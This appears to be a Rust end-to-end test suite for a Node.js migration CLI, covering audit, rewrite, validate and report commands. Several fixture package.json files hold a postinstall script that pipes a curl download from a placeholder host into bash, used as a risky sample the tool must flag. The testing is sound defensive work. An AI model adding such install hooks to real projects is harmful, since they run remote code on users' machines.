use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};
use std::thread;
use std::time::{Duration, Instant};

use frankenengine_node::migration::{
    migration_runtime_smoke_stderr_sha256_hex, migration_runtime_smoke_stdout_sha256_hex,
};
use sha2::{Digest, Sha256};
use tempfile::TempDir;

#[path = "golden/mod.rs"]
mod golden;

#[path = "migrate_rewrite_goldens.rs"]
mod migrate_rewrite_goldens;

fn repo_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(|path| path.parent())
        .expect("workspace root")
        .to_path_buf()
}

fn resolve_binary_path() -> PathBuf {
    if let Some(exe) = std::env::var_os("CARGO_BIN_EXE_franken-node") {
        return PathBuf::from(exe);
    }
    repo_root().join("target/debug/franken-node")
}

fn run_cli(args: &[&str]) -> Output {
    let binary_path = resolve_binary_path();
    assert!(
        binary_path.is_file(),
        "franken-node binary not found at {}",
        binary_path.display()
    );
    Command::new(&binary_path)
        .current_dir(repo_root())
        .args(args)
        .output()
        .unwrap_or_else(|err| panic!("failed running `{}`: {err}", args.join(" ")))
}

fn run_cli_with_wall_timeout(args: &[&str], timeout: Duration, envs: &[(&str, String)]) -> Output {
    let binary_path = resolve_binary_path();
    assert!(
        binary_path.is_file(),
        "franken-node binary not found at {}",
        binary_path.display()
    );
    let mut child = Command::new(&binary_path)
        .current_dir(repo_root())
        .args(args)
        .envs(envs.iter().map(|(key, value)| (*key, value)))
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap_or_else(|err| panic!("failed spawning `{}`: {err}", args.join(" ")));
    let started = Instant::now();

    loop {
        if child
            .try_wait()
            .unwrap_or_else(|err| panic!("failed polling `{}`: {err}", args.join(" ")))
            .is_some()
        {
            return child
                .wait_with_output()
                .unwrap_or_else(|err| panic!("failed collecting `{}`: {err}", args.join(" ")));
        }
        if started.elapsed() >= timeout {
            let _ = child.kill();
            let _ = child.wait();
            panic!(
                "`{}` exceeded external test timeout of {}ms",
                args.join(" "),
                timeout.as_millis()
            );
        }
        thread::sleep(Duration::from_millis(25));
    }
}

fn len_prefixed_digest_update(hasher: &mut Sha256, bytes: &[u8]) {
    hasher.update(u64::try_from(bytes.len()).unwrap_or(u64::MAX).to_le_bytes());
    hasher.update(bytes);
}

fn log_phase(test_name: &str, phase: &str, detail: serde_json::Value) {
    eprintln!(
        "{}",
        serde_json::to_string(&serde_json::json!({
            "suite": "migrate_cli_e2e",
            "test": test_name,
            "phase": phase,
            "detail": detail,
        }))
        .expect("structured test log serializes")
    );
}

fn parse_json_stdout(output: &Output, label: &str) -> serde_json::Value {
    serde_json::from_slice(&output.stdout).unwrap_or_else(|err| {
        panic!(
            "{label} stdout must be JSON: {err}\nstdout:\n{}\nstderr:\n{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        )
    })
}

fn write_basic_rewrite_project(project_path: &Path) {
    std::fs::create_dir_all(project_path).expect("project dir");
    std::fs::write(
        project_path.join("index.js"),
        "const fs = require(\"fs\");\nconsole.log(fs.existsSync(\"package.json\"));\n",
    )
    .expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "scripts": {
    "test": "node test.js"
  }
}
"#,
    )
    .expect("write package manifest");
}

fn write_risky_report_project(project_path: &Path) {
    std::fs::create_dir_all(project_path).expect("project dir");
    std::fs::write(
        project_path.join("index.js"),
        "const fs = require(\"fs\");\nconsole.log(fs.existsSync(\"package.json\"));\n",
    )
    .expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo-report",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl https://example.invalid/install.sh | bash"
  }
}
"#,
    )
    .expect("write risky package manifest");
}

#[test]
fn migrate_report_json_stdout_composes_audit_rewrite_validate_sections() {
    let test_name = "migrate_report_json_stdout_composes_audit_rewrite_validate_sections";
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    write_risky_report_project(&project_path);
    let original_manifest =
        std::fs::read_to_string(project_path.join("package.json")).expect("read package manifest");
    log_phase(
        test_name,
        "fixtures_written",
        serde_json::json!({"project_path": project_path.display().to_string()}),
    );

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate-report", &project_arg, "--format", "json"]);
    log_phase(
        test_name,
        "command_executed",
        serde_json::json!({
            "success": output.status.success(),
            "status": output.status.code(),
            "stdout_len": output.stdout.len(),
            "stderr_len": output.stderr.len(),
        }),
    );
    assert!(
        output.status.success(),
        "migrate-report --format json should produce a report even when validation is no-go: stdout={} stderr={}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    let payload = parse_json_stdout(&output, "migrate-report --format json");
    log_phase(
        test_name,
        "stdout_json_parsed",
        serde_json::json!({
            "schema_version": payload["schema_version"],
            "go_no_go": payload["executive_summary"]["go_no_go"],
        }),
    );
    assert_eq!(
        payload["schema_version"],
        serde_json::json!("franken-node/migrate-report/v1")
    );
    assert_eq!(
        payload["executive_summary"]["go_no_go"],
        serde_json::json!("no_go")
    );
    assert!(
        payload["executive_summary"]["risk_score"]
            .as_u64()
            .is_some_and(|score| score > 0),
        "risk score should reflect the risky fixture: {payload:#?}"
    );
    assert_eq!(
        payload["api_inventory"]["package_manifests"],
        serde_json::json!(1)
    );
    assert_eq!(
        payload["audit"]["summary"]["risky_scripts"],
        serde_json::json!(1)
    );
    assert_eq!(
        payload["rewrite_suggestions"]["apply_mode"],
        serde_json::json!(false)
    );
    assert_eq!(payload["validation"]["status"], serde_json::json!("fail"));
    let phase_names = payload["rollout_plan"]["phases"]
        .as_array()
        .expect("rollout phases array")
        .iter()
        .map(|phase| phase["name"].as_str().unwrap_or_default())
        .collect::<Vec<_>>();
    assert_eq!(phase_names, vec!["audit", "rewrite", "validate", "rollout"]);
    assert_eq!(
        std::fs::read_to_string(project_path.join("package.json")).expect("read package manifest"),
        original_manifest,
        "migrate-report must not apply rewrites while producing the report"
    );
}

#[test]
fn migrate_report_html_output_writes_escaped_report_file() {
    let test_name = "migrate_report_html_output_writes_escaped_report_file";
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project<demo&report>");
    write_risky_report_project(&project_path);
    let output_path = temp.path().join("reports/migration-report.html");
    let project_arg = project_path.to_string_lossy().to_string();
    let output_arg = output_path.to_string_lossy().to_string();
    log_phase(
        test_name,
        "fixtures_written",
        serde_json::json!({
            "project_path": project_path.display().to_string(),
            "output_path": output_path.display().to_string(),
        }),
    );

    let output = run_cli(&[
        "migrate-report",
        &project_arg,
        "--format",
        "html",
        "--output",
        &output_arg,
    ]);
    log_phase(
        test_name,
        "command_executed",
        serde_json::json!({
            "success": output.status.success(),
            "status": output.status.code(),
            "stdout_len": output.stdout.len(),
            "stderr_len": output.stderr.len(),
        }),
    );
    assert!(
        output.status.success(),
        "migrate-report --format html --output failed: stdout={} stderr={}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        output.stdout.is_empty(),
        "HTML --output mode must not also emit stdout: {}",
        String::from_utf8_lossy(&output.stdout)
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("migration report written:") && stderr.contains(&output_arg),
        "stderr should identify the written HTML report: {stderr}"
    );
    let html = std::fs::read_to_string(&output_path).expect("HTML report should be written");
    log_phase(
        test_name,
        "html_artifact_checked",
        serde_json::json!({"bytes": html.len()}),
    );
    assert!(html.contains("<section id=\"executive-summary\">"));
    assert!(html.contains("<section id=\"rollout-plan\">"));
    assert!(html.contains("go_no_go=no_go"));
    assert!(
        html.contains("project&lt;demo&amp;report&gt;"),
        "project path should be HTML-escaped: {html}"
    );
    assert!(
        !html.contains("project<demo&report>"),
        "HTML report must not contain the raw unsafe project path: {html}"
    );
}

#[test]
fn migrate_audit_sarif_out_writes_artifact_without_stdout_payload() {
    let test_name = "migrate_audit_sarif_out_writes_artifact_without_stdout_payload";
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");
    std::fs::write(project_path.join("index.js"), "console.log('audit me');\n").expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo-sarif",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl https://example.invalid/install.sh | bash"
  }
}
"#,
    )
    .expect("write risky package manifest");

    let out_path = temp.path().join("reports/migration-audit.sarif");
    let project_arg = project_path.to_string_lossy().to_string();
    let out_arg = out_path.to_string_lossy().to_string();
    log_phase(
        test_name,
        "fixtures_written",
        serde_json::json!({
            "project_path": project_path.display().to_string(),
            "sarif_path": out_path.display().to_string(),
        }),
    );

    let output = run_cli(&[
        "migrate",
        "audit",
        &project_arg,
        "--format",
        "sarif",
        "--out",
        &out_arg,
    ]);
    log_phase(
        test_name,
        "command_executed",
        serde_json::json!({
            "success": output.status.success(),
            "status": output.status.code(),
            "stdout_len": output.stdout.len(),
            "stderr_len": output.stderr.len(),
        }),
    );
    assert!(
        output.status.success(),
        "migrate audit --format sarif --out failed: stdout={} stderr={}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        output.stdout.is_empty(),
        "SARIF --out mode must not also emit a stdout payload: {}",
        String::from_utf8_lossy(&output.stdout)
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("migration audit report written:"),
        "SARIF --out mode must log the artifact path on stderr: {stderr}"
    );
    assert!(
        stderr.contains(&out_arg),
        "stderr should include the concrete SARIF path: {stderr}"
    );

    let sarif_raw = std::fs::read_to_string(&out_path).expect("SARIF report should be written");
    let sarif: serde_json::Value = serde_json::from_str(&sarif_raw)
        .unwrap_or_else(|err| panic!("SARIF report must be JSON: {err}\n{sarif_raw}"));
    log_phase(
        test_name,
        "sarif_artifact_parsed",
        serde_json::json!({
            "bytes": sarif_raw.len(),
            "result_count": sarif["runs"][0]["results"].as_array().map_or(0, Vec::len),
        }),
    );
    assert_eq!(sarif["version"], serde_json::json!("2.1.0"));
    assert_eq!(
        sarif["$schema"],
        serde_json::json!("https://json.schemastore.org/sarif-2.1.0.json")
    );
    assert_eq!(
        sarif["runs"][0]["tool"]["driver"]["name"],
        serde_json::json!("franken-node migrate audit")
    );
    let results = sarif["runs"][0]["results"]
        .as_array()
        .expect("SARIF results must be an array");
    assert!(
        results.iter().any(|result| {
            result["ruleId"]
                .as_str()
                .is_some_and(|rule_id| rule_id.starts_with("mig-audit-"))
                && result["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
                    == serde_json::json!("package.json")
        }),
        "SARIF results must include the real package.json audit finding: {sarif:#?}"
    );
}

#[test]
fn migrate_runtime_smoke_receipt_hash_helpers_are_framed() {
    let stdout_hash = migration_runtime_smoke_stdout_sha256_hex(b"same output");
    let stderr_hash = migration_runtime_smoke_stderr_sha256_hex(b"same output");
    assert_ne!(
        stdout_hash, stderr_hash,
        "stdout/stderr field labels must be bound into receipt hashes"
    );

    let mut bare_hasher = Sha256::new();
    bare_hasher.update(b"same output");
    assert_ne!(
        stdout_hash,
        hex::encode(bare_hasher.finalize()),
        "receipt hash must not be a bare SHA-256 of stdout bytes"
    );

    let mut framed_hasher = Sha256::new();
    framed_hasher.update(b"franken-node/migrate-validate-runtime-smoke/output-sha256/v1:");
    len_prefixed_digest_update(&mut framed_hasher, b"stdout");
    len_prefixed_digest_update(&mut framed_hasher, b"same output");
    assert_eq!(
        stdout_hash,
        hex::encode(framed_hasher.finalize()),
        "stdout receipt hash must use domain-separated length-prefixed framing"
    );
}

#[test]
fn migrate_rewrite_apply_emits_rollback_plan_and_updates_manifest() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    write_basic_rewrite_project(&project_path);

    let rollback_path = temp.path().join("rollback/plan.json");
    let project_arg = project_path.to_string_lossy().to_string();
    let rollback_arg = rollback_path.to_string_lossy().to_string();
    let output = run_cli(&[
        "migrate",
        "rewrite",
        &project_arg,
        "--apply",
        "--emit-rollback",
        &rollback_arg,
    ]);

    assert!(
        output.status.success(),
        "migrate rewrite failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("franken-node migrate rewrite"));
    assert!(stdout.contains("mode: apply"));
    assert!(stdout.contains("rewrites_planned=2"));
    assert!(stdout.contains("rewrites_applied=2"));
    golden::assert_scrubbed_golden("migrate/rewrite_apply_stdout", &stdout);
    log_phase(
        "migrate_rewrite_apply_emits_rollback_plan_and_updates_manifest",
        "human_output_checked",
        serde_json::json!({"stdout_len": stdout.len(), "rollback_path": rollback_arg}),
    );

    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("migration rollback artifact written:"));
    golden::assert_scrubbed_golden("migrate/rewrite_apply_stderr", &stderr);

    let rollback_json =
        std::fs::read_to_string(&rollback_path).expect("rollback artifact should be written");
    let rollback: serde_json::Value = serde_json::from_str(&rollback_json)
        .unwrap_or_else(|err| panic!("invalid rollback json: {err}\n{rollback_json}"));
    assert_eq!(
        rollback["schema_version"],
        serde_json::Value::String("1.0.0".to_string())
    );
    assert_eq!(rollback["apply_mode"], serde_json::Value::Bool(true));
    assert_eq!(
        rollback["entry_count"].as_u64().unwrap_or_default(),
        2,
        "expected package manifest and source rollback entries"
    );
    golden::assert_scrubbed_json_golden("migrate/rewrite_apply_rollback_plan", &rollback);

    let rewritten_package =
        std::fs::read_to_string(project_path.join("package.json")).expect("read rewritten package");
    golden::assert_scrubbed_golden("migrate/rewrite_apply_manifest", &rewritten_package);
    let rewritten: serde_json::Value = serde_json::from_str(&rewritten_package)
        .unwrap_or_else(|err| panic!("rewritten package should be valid json: {err}"));
    assert_eq!(
        rewritten["engines"]["node"],
        serde_json::Value::String(">=20 <23".to_string())
    );

    let rewritten_source =
        std::fs::read_to_string(project_path.join("index.js")).expect("read rewritten source");
    assert!(rewritten_source.contains("import fs from \"node:fs\";"));
    assert!(!rewritten_source.contains("require("));
    let source_backup = std::fs::read_to_string(project_path.join(".migrate-backup/index.js"))
        .expect("read source backup");
    assert!(source_backup.contains("const fs = require(\"fs\");"));
}

#[test]
fn migrate_rewrite_dry_run_json_emits_machine_report() {
    let test_name = "migrate_rewrite_dry_run_json_emits_machine_report";
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    write_basic_rewrite_project(&project_path);
    log_phase(
        test_name,
        "project_created",
        serde_json::json!({"project_path": project_path.display().to_string()}),
    );

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "rewrite", &project_arg, "--json"]);
    log_phase(
        test_name,
        "command_executed",
        serde_json::json!({"success": output.status.success(), "status": output.status.code()}),
    );
    assert!(
        output.status.success(),
        "migrate rewrite --json failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        !stdout.contains("franken-node migrate rewrite"),
        "--json stdout must not include human heading"
    );
    let payload = parse_json_stdout(&output, "migrate rewrite --json dry-run");
    log_phase(
        test_name,
        "stdout_json_parsed",
        serde_json::json!({"keys": payload.as_object().map_or(0, |object| object.len())}),
    );
    assert_eq!(payload["schema_version"], "1.0.0");
    assert_eq!(payload["apply_mode"], false);
    assert_eq!(payload["package_manifests_scanned"], 1);
    assert_eq!(payload["rewrites_planned"], 2);
    assert_eq!(payload["rewrites_applied"], 0);
    assert_eq!(payload["manual_review_items"], 0);
    assert_eq!(
        payload["entries"].as_array().expect("entries array").len(),
        3
    );
    assert_eq!(
        payload["rollback_entries"]
            .as_array()
            .expect("rollback entries array")
            .len(),
        2
    );
    assert!(
        String::from_utf8_lossy(&output.stderr).is_empty(),
        "dry-run JSON should not write rollback stderr without --emit-rollback"
    );

    let source = std::fs::read_to_string(project_path.join("index.js")).expect("read source");
    assert!(source.contains("require(\"fs\")"));
    assert!(
        !project_path.join(".migrate-backup/index.js").exists(),
        "dry-run JSON must not create backup artifacts"
    );
}

#[test]
fn migrate_rewrite_apply_json_keeps_rollback_artifact_separate() {
    let test_name = "migrate_rewrite_apply_json_keeps_rollback_artifact_separate";
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    write_basic_rewrite_project(&project_path);
    let rollback_path = temp.path().join("rollback/plan.json");
    log_phase(
        test_name,
        "project_created",
        serde_json::json!({
            "project_path": project_path.display().to_string(),
            "rollback_path": rollback_path.display().to_string(),
        }),
    );

    let project_arg = project_path.to_string_lossy().to_string();
    let rollback_arg = rollback_path.to_string_lossy().to_string();
    let output = run_cli(&[
        "migrate",
        "rewrite",
        &project_arg,
        "--apply",
        "--json",
        "--emit-rollback",
        &rollback_arg,
    ]);
    log_phase(
        test_name,
        "command_executed",
        serde_json::json!({"success": output.status.success(), "status": output.status.code()}),
    );
    assert!(
        output.status.success(),
        "migrate rewrite --apply --json failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let payload = parse_json_stdout(&output, "migrate rewrite --apply --json");
    log_phase(
        test_name,
        "stdout_json_parsed",
        serde_json::json!({"rewrites_applied": payload["rewrites_applied"]}),
    );
    assert_eq!(payload["schema_version"], "1.0.0");
    assert_eq!(payload["apply_mode"], true);
    assert_eq!(payload["rewrites_planned"], 2);
    assert_eq!(payload["rewrites_applied"], 2);
    assert_eq!(
        payload["rollback_entries"]
            .as_array()
            .expect("rollback entries array")
            .len(),
        2
    );

    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("migration rollback artifact written:"));
    assert!(
        !stderr.contains("\"schema_version\""),
        "rollback JSON must not be mixed into stderr"
    );
    let rollback_json =
        std::fs::read_to_string(&rollback_path).expect("rollback artifact should be written");
    let rollback: serde_json::Value = serde_json::from_str(&rollback_json)
        .unwrap_or_else(|err| panic!("invalid rollback json: {err}\n{rollback_json}"));
    assert_eq!(rollback["schema_version"], "1.0.0");
    assert_eq!(rollback["apply_mode"], true);
    assert_eq!(rollback["entry_count"].as_u64(), Some(2));
    log_phase(
        test_name,
        "rollback_artifact_checked",
        serde_json::json!({"entry_count": rollback["entry_count"]}),
    );

    let rewritten_source =
        std::fs::read_to_string(project_path.join("index.js")).expect("read rewritten source");
    assert!(rewritten_source.contains("import fs from \"node:fs\";"));
    assert!(!rewritten_source.contains("require("));
}

#[test]
fn migrate_rewrite_apply_handles_commonjs_destructuring_export_and_nested_requires() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    let original_source = "#!/usr/bin/env node\nconst { readFile, writeFile: write } = require('fs'); // fs api\nconst literal = \"require('path') remains a string\";\n// const fake = require('crypto');\nfunction platform() {\n  const os = require(\"os\");\n  return os.platform();\n}\nmodule.exports = { readFile, writer: write };\n";
    std::fs::write(project_path.join("index.js"), original_source).expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "engines": {
    "node": ">=20 <23"
  }
}
"#,
    )
    .expect("write package manifest");

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "rewrite", &project_arg, "--apply"]);
    assert!(
        output.status.success(),
        "migrate rewrite failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("rewrites_planned=1"));
    assert!(stdout.contains("rewrites_applied=1"));

    let rewritten_source =
        std::fs::read_to_string(project_path.join("index.js")).expect("read rewritten source");
    assert!(rewritten_source.starts_with("#!/usr/bin/env node\n"));
    assert!(
        rewritten_source
            .contains("import { readFile, writeFile as write } from \"node:fs\"; // fs api")
    );
    assert!(rewritten_source.contains("import os from \"node:os\";"));
    assert!(rewritten_source.contains("export { readFile, write as writer };"));
    assert!(rewritten_source.contains("const literal = \"require('path') remains a string\";"));
    assert!(rewritten_source.contains("// const fake = require('crypto');"));
    assert!(!rewritten_source.contains("const os = require(\"os\")"));

    let source_backup = std::fs::read_to_string(project_path.join(".migrate-backup/index.js"))
        .expect("read source backup");
    assert_eq!(source_backup, original_source);
}

#[test]
fn migrate_rewrite_bails_on_computed_require_without_mutating_source() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    let original_source = "const target = './plugin';\nconst plugin = require(target);\n";
    std::fs::write(project_path.join("index.js"), original_source).expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "engines": {
    "node": ">=20 <23"
  }
}
"#,
    )
    .expect("write package manifest");

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "rewrite", &project_arg, "--apply"]);
    assert!(
        output.status.success(),
        "migrate rewrite failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("rewrites_planned=0"));
    assert!(stdout.contains("manual_review_items=1"));
    assert!(stdout.contains("dynamic or non-literal require() usage detected"));

    let unchanged_source =
        std::fs::read_to_string(project_path.join("index.js")).expect("read unchanged source");
    assert_eq!(unchanged_source, original_source);
    assert!(!project_path.join(".migrate-backup/index.js").exists());
}

#[test]
fn migrate_validate_fails_for_risky_project_and_returns_non_zero_exit() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    std::fs::write(project_path.join("index.js"), "console.log('hello');\n").expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl https://example.invalid/install.sh | bash"
  }
}
"#,
    )
    .expect("write package manifest");

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "validate", &project_arg]);
    assert!(
        !output.status.success(),
        "validate should fail for risky project"
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("franken-node migrate validate"));
    assert!(stdout.contains("status: FAIL"));
    assert!(stdout.contains("[mig-validate-002] FAIL"));
    assert!(stdout.contains("[mig-validate-003] FAIL"));
    assert!(stdout.contains("[mig-validate-005] FAIL"));
    assert!(stdout.contains("runtime smoke test skipped because static validation checks failed"));

    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("migration validation failed for"));
}

#[test]
fn migrate_validate_passes_for_hardened_project() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    std::fs::write(project_path.join("index.js"), "console.log('hello');\n").expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "engines": {
    "node": ">=20 <23"
  },
  "scripts": {
    "test": "node test.js"
  }
}
"#,
    )
    .expect("write package manifest");
    std::fs::write(project_path.join("package-lock.json"), "{}\n").expect("write lockfile");

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "validate", &project_arg]);
    assert!(
        output.status.success(),
        "validate should pass for hardened project: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("franken-node migrate validate"));
    assert!(stdout.contains("status: PASS"));
    assert!(stdout.contains("[mig-validate-005] PASS"));
    assert!(stdout.contains("runtime smoke test passed"));
    assert!(stdout.contains("receipt_round_trip=true"));
}

#[test]
fn migrate_validate_timeout_path_does_not_block_on_inherited_pipes() {
    #[cfg(not(unix))]
    {
        eprintln!("skipping inherited-pipe timeout regression: unix shell unavailable");
        return;
    }

    #[cfg(unix)]
    let temp = TempDir::new().expect("temp dir");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;

        let shim_dir = temp.path().join("bin");
        std::fs::create_dir_all(&shim_dir).expect("shim dir");
        let node_shim = shim_dir.join("node");
        std::fs::write(&node_shim, "#!/bin/sh\n(sleep 60 >&1 2>&2) &\nsleep 60\n")
            .expect("write node shim");
        let mut permissions = std::fs::metadata(&node_shim)
            .expect("node shim metadata")
            .permissions();
        permissions.set_mode(0o755);
        std::fs::set_permissions(&node_shim, permissions).expect("chmod node shim");

        let previous_path = std::env::var("PATH").unwrap_or_default();
        let shimmed_path = format!("{}:{previous_path}", shim_dir.display());

        let project_path = temp.path().join("project");
        std::fs::create_dir_all(project_path.join("scripts")).expect("project scripts dir");
        std::fs::write(
            project_path.join("scripts/hang.js"),
            "this is intentionally invalid JavaScript so franken-node falls back to node\n",
        )
        .expect("write hanging smoke script");
        std::fs::write(
            project_path.join("package.json"),
            r#"{
  "name": "demo-timeout",
  "version": "1.0.0",
  "engines": {
    "node": ">=20 <23"
  },
  "scripts": {
    "smoke": "node scripts/hang.js"
  }
}
"#,
        )
        .expect("write package manifest");
        std::fs::write(project_path.join("package-lock.json"), "{}\n").expect("write lockfile");

        let project_arg = project_path.to_string_lossy().to_string();
        let started = Instant::now();
        let output = run_cli_with_wall_timeout(
            &["migrate", "validate", &project_arg],
            Duration::from_secs(20),
            &[("PATH", shimmed_path)],
        );

        assert!(
            started.elapsed() < Duration::from_secs(20),
            "migrate validate should fail fast on smoke timeout"
        );
        assert!(
            !output.status.success(),
            "validate should fail when runtime smoke times out"
        );
        let stdout = String::from_utf8_lossy(&output.stdout);
        assert!(stdout.contains("[mig-validate-005] FAIL"));
        assert!(stdout.contains("runtime smoke command timed out after"));
    }
}
